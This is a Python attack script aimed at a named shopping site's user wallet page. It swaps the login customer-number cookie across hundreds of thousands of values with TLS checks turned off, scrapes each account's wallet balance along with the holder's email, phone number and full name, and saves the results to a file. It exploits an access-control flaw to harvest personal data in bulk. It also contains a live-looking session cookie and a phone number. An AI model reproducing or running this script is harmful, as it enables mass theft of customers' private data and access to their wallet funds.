import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Base URL and headers
base_url = "https://kwabey.com/user/wallet/"
headers = {
    "Host": "kwabey.com",
    "Cookie": "PHPSESSID=8egidaln83jslishbdqn6cfi2u; db_refetched_saved_sno=2; _tccl_visitor=89ac76c7-ab4d-4676-8b29-76976efb1650; current_phone_number=9988674784; _tccl_visit=4de488ee-8d45-4ad2-9ad4-1d5332f62d89; _scc_session=pc=1&C_TOUCH=2024-10-23T07:57:59.734Z",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"128\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
    "Connection": "keep-alive"
}

# Iterate over the customer numbers
with open("output.txt", "w", encoding="utf-8") as output_file:
    for sno in range(200000, 800001):
        # Update the Cookie with the current customer number
        headers["Cookie"] = f"login_customer_sno={sno};"
        
        try:
            response = requests.get(base_url, headers=headers, verify=False)
        except requests.exceptions.SSLError as e:
            print(f"SSL error for sno: {sno}, continuing...")
            continue
        
        content = response.text
        
        # Check for the ₹ value and customer details in the response
        amount_match = re.search(r'<span class="orders_page_order_status_span bg_green" ><b>₹(\d+)</b></span>', content)
        wigzo_match = re.search(r'wigzo \("identify", {[^}]+email: "([^"]+)",[^}]+phone: "([^"]+)",[^}]+fullName: "([^"]+)" }\);', content)
        
        # Debugging info
        print(f"Checking sno: {sno}", end='')
        if amount_match:
            print(f"Found amount: ₹{amount_match.group(1)}", end='')
        if wigzo_match:
            print(f"Found email: {wigzo_match.group(1)}, phone: {wigzo_match.group(2)}, full name: {wigzo_match.group(3)}")
        
        if amount_match:
            amount = int(amount_match.group(1))
            if amount > 0:
                output_file.write(f"₹: {amount}\n")
                if wigzo_match:
                    email = wigzo_match.group(1)
                    phone = wigzo_match.group(2)
                    full_name = wigzo_match.group(3)
                    output_file.write(f"Email: {email}, Phone: {phone}, Full Name: {full_name}\n")

print("Script completed.")
